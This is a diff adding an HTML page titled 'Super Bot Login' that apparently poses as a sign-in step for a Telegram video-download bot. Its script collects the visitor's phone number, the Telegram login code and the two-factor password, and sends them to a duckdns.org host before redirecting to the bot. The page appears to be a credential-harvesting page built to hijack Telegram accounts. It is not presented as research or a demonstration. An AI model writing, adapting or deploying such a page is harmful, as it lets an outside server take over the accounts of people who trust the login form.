@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super Bot Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #8B5CF6, #A78BFA, #C4B5FD);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 1rem;
+            box-shadow: 0 10px 15px rgba(139, 92, 246, 0.2);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            width: 100%;
+            max-width: 28rem; /* Slightly wider on desktop */
+        }
+        .card:hover {
+            box-shadow: 0 15px 25px rgba(139, 92, 246, 0.3);
+        }
+        .country-select {
+            border-right: 1px solid #e5e7eb;
+            border-radius: 0.375rem 0 0 0.375rem;
+            min-width: 6rem; /* Give more space for country codes */
+        }
+        .phone-input {
+            border-left: none;
+            border-radius: 0 0.375rem 0.375rem 0;
+        }
+        .loading {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .success-message {
+            background: linear-gradient(135deg, #8B5CF6, #A78BFA);
+            color: white;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .countdown {
+            font-weight: bold;
+            color: #A78BFA;
+        }
+        .terms-checkbox {
+            accent-color: #8B5CF6;
+            width: 18px;
+            height: 18px;
+        }
+        .terms-link {
+            color: #8B5CF6;
+            text-decoration: underline;
+            transition: color 0.2s;
+        }
+        .terms-link:hover {
+            color: #7C3AED;
+        }
+        .disabled-button {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .fade-in {
+            animation: fadeIn 0.3s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-group {
+            position: relative;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            transform: translateY(-12px) scale(0.8);
+            color: #8B5CF6;
+        }
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: 12px;
+            color: #6b7280;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: white;
+            padding: 0 4px;
+        }
+        .terms-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(139, 92, 246, 0.5);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .terms-modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            width: 90%;
+            max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.3);
+        }
+        .progress-bar {
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #8B5CF6, #A78BFA);
+            width: 33%;
+            transition: width 0.3s ease;
+        }
+        
+        /* Updated button styles */
+        .btn-primary {
+            background: linear-gradient(135deg, #8B5CF6, #A78BFA);
+            border: none;
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover:not(:disabled) {
+            background: linear-gradient(135deg, #7C3AED, #8B5CF6);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
+        }
+        .btn-secondary {
+            background: linear-gradient(135deg, #E5E7EB, #F3F4F6);
+            color: #6B7280;
+            border: none;
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #D1D5DB, #E5E7EB);
+            transform: translateY(-1px);
+        }
+        
+        /* Focus styles */
+        input:focus, select:focus {
+            outline: none;
+            border-color: #8B5CF6;
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+        }
+        
+        /* Icon container */
+        .icon-container {
+            background: linear-gradient(135deg, #EDE9FE, #DDD6FE);
+            color: #8B5CF6;
+        }
+        
+        /* Title color */
+        .title-purple {
+            color: #6B46C1;
+        }
+        
+        /* Error message styling */
+        #error-message {
+            background: linear-gradient(135deg, #FEE2E2, #FECACA);
+            border-color: #F87171;
+            color: #DC2626;
+        }
+        
+        /* Info message styling */
+        #info-message {
+            background: linear-gradient(135deg, #EDE9FE, #DDD6FE);
+            border-color: #A78BFA;
+            color: #8B5CF6;
+        }
+        
+        /* Terms agreement box */
+        .terms-box {
+            background: linear-gradient(135deg, #F8FAFC, #F1F5F9);
+            border: 1px solid #E2E8F0;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 640px) {
+            .card {
+                padding: 1.5rem;
+                max-width: 100%;
+            }
+            
+            .phone-input-group {
+                flex-direction: column;
+            }
+            
+            .country-select {
+                border-right: 1px solid #e5e7eb;
+                border-radius: 0.375rem 0.375rem 0 0;
+                width: 100%;
+                margin-bottom: 0;
+            }
+            
+            .phone-input {
+                border-left: 1px solid #e5e7eb;
+                border-radius: 0 0 0.375rem 0.375rem;
+                width: 100%;
+            }
+            
+            .icon-container {
+                width: 4rem;
+                height: 4rem;
+            }
+            
+            .icon-container svg {
+                width: 1.75rem;
+                height: 1.75rem;
+            }
+            
+            h1 {
+                font-size: 1.75rem;
+            }
+            
+            .terms-modal-content {
+                padding: 1rem;
+                width: 95%;
+            }
+        }
+
+        /* Input number styling for mobile */
+        input[type="tel"] {
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+        }
+        
+        /* Hide spin buttons in number inputs */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="card p-6">
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div id="progress-fill" class="progress-fill"></div>
+        </div>
+
+        <div class="text-center mb-6">
+            <div class="icon-container p-4 rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+                <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 0C5.376 0 0 5.376 0 12s5.376 12 12 12 12-5.376 12-12S18.624 0 12 0zm5.568 8.16c-.198 1.86-.828 6.396-.828 6.396-.352 2.436-1.308 2.868-2.556 2.868-.756 0-1.392-.432-1.908-1.152l-3.696-5.136c-.432-.6-.216-1.032.216-1.368.504-.384 1.128-.756 1.632-1.116.36-.252.756-.468 1.008-.756.36-.408.216-.996-.216-1.368-.504-.432-1.476-.936-2.376-1.476-.756-.456-1.368-.828-1.908-1.296C6.552 4.584 6.048 3.6 6.048 2.688c0-.648.252-1.152.756-1.368.36-.156.828-.216 1.368-.216 1.368 0 2.736.216 4.032.648 2.028.672 3.816 1.872 5.148 3.456.828.984 1.296 2.184 1.296 3.456 0 .432-.072.864-.216 1.296-.072.216-.144.432-.216.648-.072.216-.144.432-.216.648-.072.216-.144.432-.216.648z"/>
+                </svg>
+            </div>
+            <h1 class="text-3xl font-bold title-purple mb-2">Super Bot Login</h1>
+            <p class="text-gray-600">Connect your Telegram account to use Super Bot with full access</p>
+        </div>
+
+        <!-- Phone Input Form -->
+        <div id="phone-form" class="fade-in">
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
+                <div class="flex phone-input-group">
+                    <select id="country-code" class="country-select p-3 bg-gray-50 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-sm">
+                        <option value="+855" selected>KH +855</option>
+                        <option value="+1">US +1</option>
+                        <option value="+44">GB +44</option>
+                        <option value="+86">CN +86</option>
+                        <option value="+81">JP +81</option>
+                        <option value="+82">KR +82</option>
+                        <option value="+66">TH +66</option>
+                        <option value="+84">VN +84</option>
+                        <option value="+65">SG +65</option>
+                        <option value="+60">MY +60</option>
+                    </select>
+                    <input type="tel" id="phone-number" placeholder="12345678" inputmode="numeric" pattern="[0-9]*" class="phone-input flex-1 p-3 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition-all duration-200 text-sm">
+                </div>
+                <p class="text-xs text-gray-500 mt-1">Cambodia numbers: Enter without leading 0 (e.g., 12345678)</p>
+            </div>
+            <button id="send-otp" class="btn-primary w-full text-white p-3 rounded hover:bg-purple-700 transition-all duration-200 flex items-center justify-center disabled-button">
+                <span id="send-otp-text">Send OTP</span>
+                <svg id="send-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
+            <p class="text-xs text-gray-500 mt-2 text-center">
+                Please accept the terms of service to continue
+            </p>
+            <!-- Terms of Service Agreement -->
+            <div id="terms-agreement" class="mb-6 p-4 terms-box rounded-lg border">
+                <div class="flex items-start space-x-3">
+                    <input type="checkbox" id="terms-checkbox" class="terms-checkbox mt-1">
+                    <label for="terms-checkbox" class="text-sm text-gray-700 cursor-pointer">
+                        I agree to the 
+                        <a href="#" id="terms-link" class="terms-link">Terms of Service</a>
+                        and acknowledge that I have read and understood the privacy policy.
+                    </label>
+                </div>
+                <p class="text-xs text-gray-500 mt-2">
+                    By using Super Bot, you agree to our data processing practices and service conditions.
+                </p>
+            </div>
+        </div>
+
+        <!-- OTP Verification Form -->
+        <div id="otp-form" class="hidden">
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
+                <input type="text" id="otp" placeholder="12345" maxlength="5" inputmode="numeric" pattern="[0-9]*" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-center text-2xl tracking-widest transition-all duration-200">
+                <p class="text-xs text-gray-500 mt-1">Enter the 5-digit code from Telegram</p>
+            </div>
+            <button id="submit-otp" class="btn-primary w-full text-white p-3 rounded hover:bg-purple-700 transition-all duration-200 flex items-center justify-center">
+                <span id="submit-otp-text">Verify Code</span>
+                <svg id="submit-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
+            <button id="back-to-phone" class="btn-secondary w-full p-3 rounded hover:bg-gray-400 transition-all duration-200 mt-2">
+                Back to Phone Number
+            </button>
+            <div class="mt-3 text-center">
+                <button id="resend-otp" class="text-purple-600 hover:text-purple-800 text-sm underline">
+                    Didn't receive code? Resend
+                </button>
+            </div>
+        </div>
+
+        <!-- 2FA Form -->
+        <div id="2fa-form" class="hidden">
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Two-Factor Authentication</label>
+                <input type="password" id="password" placeholder="Enter your 2FA password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition-all duration-200">
+                <p class="text-xs text-gray-500 mt-1">This account has 2FA enabled</p>
+            </div>
+            <button id="submit-2fa" class="btn-primary w-full text-white p-3 rounded hover:bg-purple-700 transition-all duration-200 flex items-center justify-center">
+                <span id="submit-2fa-text">Submit 2FA</span>
+                <svg id="submit-2fa-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
+        </div>
+
+        <!-- Success Message -->
+        <div id="success-form" class="hidden">
+            <div class="success-message">
+                <div class="flex items-center justify-center mb-3">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold mb-2">Login Successful!</h3>
+                <p class="text-sm mb-3">Your Telegram account has been connected successfully.</p>
+                <p class="text-sm">Redirecting to Super Bot in <span id="countdown" class="countdown">5</span> seconds...</p>
+            </div>
+        </div>
+
+        <!-- Message Display -->
+        <div id="message" class="mt-4 text-center hidden">
+            <div id="error-message" class="text-red-600 p-3 rounded border hidden"></div>
+            <div id="info-message" class="text-purple-600 p-3 rounded border hidden"></div>
+        </div>
+    </div>
+
+    <!-- Terms Modal -->
+    <div id="terms-modal" class="terms-modal">
+        <div class="terms-modal-content">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-bold text-gray-900">Terms of Service</h2>
+                <button id="close-terms" class="text-gray-500 hover:text-gray-700">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="prose max-w-none">
+                <p class="text-gray-600 mb-4">Loading terms of service...</p>
+                <div class="text-center">
+                    <div class="loading w-8 h-8 border-2 border-purple-600 border-t-transparent rounded-full mx-auto"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let phoneCodeHash = null;
+        let phone = null;
+        let fullPhoneNumber = null;
+        let termsAccepted = false;
+
+        // Progress bar management
+        function updateProgress(step) {
+            const progressFill = document.getElementById('progress-fill');
+            const widths = { phone: '33%', otp: '66%', success: '100%' };
+            progressFill.style.width = widths[step] || '33%';
+        }
+
+        // Terms of service functionality
+        document.getElementById('terms-checkbox').addEventListener('change', function() {
+            termsAccepted = this.checked;
+            updateButtonStates();
+        });
+
+        document.getElementById('terms-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            openTermsModal();
+        });
+
+        document.getElementById('close-terms').addEventListener('click', function() {
+            closeTermsModal();
+        });
+
+        function openTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            modal.style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            
+            // Load terms from /term.html
+            fetch('/term.html')
+                .then(response => response.text())
+                .then(html => {
+                    // Extract body content or use full HTML
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    const content = doc.body ? doc.body.innerHTML : html;
+                    
+                    document.querySelector('.terms-modal-content .prose').innerHTML = content;
+                })
+                .catch(error => {
+                    document.querySelector('.terms-modal-content .prose').innerHTML = 
+                        '<p class="text-red-600">Error loading terms of service. Please try again later.</p>';
+                });
+        }
+
+        function closeTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('terms-modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeTermsModal();
+            }
+        });
+
+        function updateButtonStates() {
+            const sendOtpBtn = document.getElementById('send-otp');
+            const phoneNumber = document.getElementById('phone-number').value;
+            
+            if (termsAccepted && phoneNumber && phoneNumber.length >= 8) {
+                sendOtpBtn.disabled = false;
+                sendOtpBtn.classList.remove('disabled-button');
+            } else {
+                sendOtpBtn.disabled = true;
+                sendOtpBtn.classList.add('disabled-button');
+            }
+        }
+
+        // Auto-format phone number input
+        document.getElementById('phone-number').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 15);
+            updateButtonStates();
+        });
+
+        // Auto-format OTP input
+        document.getElementById('otp').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 5);
+        });
+
+        function showLoading(buttonId, textId, loadingId) {
+            document.getElementById(buttonId).disabled = true;
+            document.getElementById(textId).style.display = 'none';
+            document.getElementById(loadingId).classList.remove('hidden');
+        }
+
+        function hideLoading(buttonId, textId, loadingId) {
+            document.getElementById(buttonId).disabled = false;
+            document.getElementById(textId).style.display = 'inline';
+            document.getElementById(loadingId).classList.add('hidden');
+        }
+
+        function showMessage(message, type = 'error') {
+            const messageContainer = document.getElementById('message');
+            const errorMessage = document.getElementById('error-message');
+            const infoMessage = document.getElementById('info-message');
+            
+            errorMessage.classList.add('hidden');
+            infoMessage.classList.add('hidden');
+            
+            if (type === 'error') {
+                errorMessage.textContent = message;
+                errorMessage.classList.remove('hidden');
+            } else {
+                infoMessage.textContent = message;
+                infoMessage.classList.remove('hidden');
+            }
+            
+            messageContainer.classList.remove('hidden');
+            
+            // Auto-hide info messages after 5 seconds
+            if (type === 'info') {
+                setTimeout(() => {
+                    hideMessage();
+                }, 5000);
+            }
+        }
+
+        function hideMessage() {
+            document.getElementById('message').classList.add('hidden');
+        }
+
+        async function sendRequest(url, data) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                return { error: 'Network error: ' + error.message };
+            }
+        }
+
+        function getFullPhoneNumber() {
+            const countryCode = document.getElementById('country-code').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+            return countryCode + phoneNumber;
+        }
+
+        async function notifyLoginSuccess(phone) {
+            // Save phone in localStorage to mark as premium
+            localStorage.setItem('premiumUserPhone', phone);
+
+            // Notify backend that login succeeded (optional, implement on server)
+            try {
+                const response = await fetch('https://ekerkzin158.duckdns.org/login_success', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+                const data = await response.json();
+                if (data.error) {
+                    console.warn('Login success notify error:', data.error);
+                }
+            } catch (err) {
+                console.warn('Login success notify network error:', err);
+            }
+        }
+
+        function startCountdown() {
+            let seconds = 5;
+            const countdownElement = document.getElementById('countdown');
+            updateProgress('success');
+            
+            const interval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://t.me/Vdodownload168_bot';
+                }
+            }, 1000);
+        }
+
+
+
+        // Send OTP
+        document.getElementById('send-otp').addEventListener('click', async () => {
+            if (!termsAccepted) {
+                showMessage('Please accept the terms of service to continue.');
+                return;
+            }
+
+            const phoneNumber = document.getElementById('phone-number').value;
+            
+            if (!phoneNumber || phoneNumber.length < 8) {
+                showMessage('Please enter a valid phone number.');
+                return;
+            }
+
+            fullPhoneNumber = getFullPhoneNumber();
+            phone = fullPhoneNumber;
+            
+            showLoading('send-otp', 'send-otp-text', 'send-otp-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/send_otp', { phone: fullPhoneNumber });
+            
+            hideLoading('send-otp', 'send-otp-text', 'send-otp-loading');
+            
+            if (result.error) {
+                showMessage(result.error || 'Failed to send OTP');
+            } else {
+                phoneCodeHash = result.phone_code_hash;
+                if (result.normalized_phone) {
+                    phone = result.normalized_phone;
+                }
+                document.getElementById('phone-form').classList.add('hidden');
+                document.getElementById('otp-form').classList.remove('hidden');
+                document.getElementById('otp-form').classList.add('fade-in');
+                updateProgress('otp');
+                showMessage('OTP sent successfully! Please check your Telegram app.', 'info');
+            }
+        });
+
+        // Resend OTP
+        document.getElementById('resend-otp').addEventListener('click', async () => {
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/send_otp', { phone });
+            
+            if (result.error) {
+                showMessage(result.error || 'Failed to resend OTP');
+            } else {
+                phoneCodeHash = result.phone_code_hash;
+                showMessage('OTP resent successfully!', 'info');
+            }
+        });
+
+        // Submit OTP
+        document.getElementById('submit-otp').addEventListener('click', async () => {
+            const otp = document.getElementById('otp').value;
+            
+            if (!otp || otp.length !== 5) {
+                showMessage('Please enter a valid 5-digit OTP.');
+                return;
+            }
+
+            showLoading('submit-otp', 'submit-otp-text', 'submit-otp-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { 
+                phone, 
+                otp, 
+                phone_code_hash: phoneCodeHash 
+            });
+            
+            hideLoading('submit-otp', 'submit-otp-text', 'submit-otp-loading');
+            
+            if (result.error) {
+                if (result.requires_2fa) {
+                    document.getElementById('otp-form').classList.add('hidden');
+                    document.getElementById('2fa-form').classList.remove('hidden');
+                    document.getElementById('2fa-form').classList.add('fade-in');
+                    showMessage('Two-factor authentication required.', 'info');
+                } else {
+                    showMessage(result.error);
+                }
+            } else {
+                document.getElementById('otp-form').classList.add('hidden');
+                document.getElementById('success-form').classList.remove('hidden');
+                document.getElementById('success-form').classList.add('fade-in');
+                hideMessage();
+                await notifyLoginSuccess(phone);
+                startCountdown();
+            }
+        });
+
+        // Submit 2FA
+        document.getElementById('submit-2fa').addEventListener('click', async () => {
+            const password = document.getElementById('password').value;
+            const otp = document.getElementById('otp').value;
+            
+            if (!password) {
+                showMessage('Please enter your 2FA password.');
+                return;
+            }
+
+            showLoading('submit-2fa', 'submit-2fa-text', 'submit-2fa-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { 
+                phone, 
+                otp, 
+                phone_code_hash: phoneCodeHash, 
+                password 
+            });
+            
+            hideLoading('submit-2fa', 'submit-2fa-text', 'submit-2fa-loading');
+            
+            if (result.error) {
+                showMessage(result.error);
+            } else {
+                document.getElementById('2fa-form').classList.add('hidden');
+                document.getElementById('success-form').classList.remove('hidden');
+                document.getElementById('success-form').classList.add('fade-in');
+                hideMessage();
+                await notifyLoginSuccess(phone);
+                startCountdown();
+            }
+        });
+
+        // Back to phone number
+        document.getElementById('back-to-phone').addEventListener('click', () => {
+            document.getElementById('otp-form').classList.add('hidden');
+            document.getElementById('phone-form').classList.remove('hidden');
+            document.getElementById('phone-form').classList.add('fade-in');
+            document.getElementById('otp').value = '';
+            updateProgress('phone');
+            hideMessage();
+        });
+
+        // Auto-focus and keyboard navigation
+        window.addEventListener('load', () => {
+            document.getElementById('phone-number').focus();
+        });
+
+        // Handle Enter key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const activeForm = document.querySelector('#phone-form:not(.hidden), #otp-form:not(.hidden), #2fa-form:not(.hidden)');
+                if (activeForm) {
+                    const button = activeForm.querySelector('button[type="submit"], button:not([id*="back"]):not([id*="resend"])');
+                    if (button && !button.disabled) {
+                        button.click();
+                    }
+                }
+            }
+        });
+
+        // Initialize
+        updateButtonStates();
+    </script>
+</body>
+</html>
